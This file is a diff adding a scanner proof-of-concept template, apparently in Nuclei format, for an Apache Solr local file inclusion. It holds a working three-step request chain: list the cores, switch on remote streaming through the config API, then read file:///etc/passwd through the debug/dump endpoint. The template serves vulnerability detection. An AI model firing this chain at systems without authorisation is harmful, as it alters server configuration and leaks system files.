@@ -1,0 +1,63 @@
+id: poc-yaml-solr-lfi
+
+info:
+  name: poc-yaml-solr-lfi
+  author: yywing
+  severity: high
+  tags: xray-converted,lfi,ct-158741
+  reference:
+    - https://mp.weixin.qq.com/s/1D4j7cF49yfrh1hErD_3OA
+
+http:
+  - raw:
+      - |
+        GET /solr/admin/cores?wt=json HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "responseHeader"
+  - raw:
+      - |
+        POST /solr/{{core}}/config HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+        "set-property":{
+        "requestDispatcher.requestParsers.enableRemoteStreaming":true
+        }
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "This response format is experimental"
+  - raw:
+      - |
+        POST /solr/{{core}}/debug/dump?param=ContentStreams HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        stream.url=file:///etc/passwd
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0:"
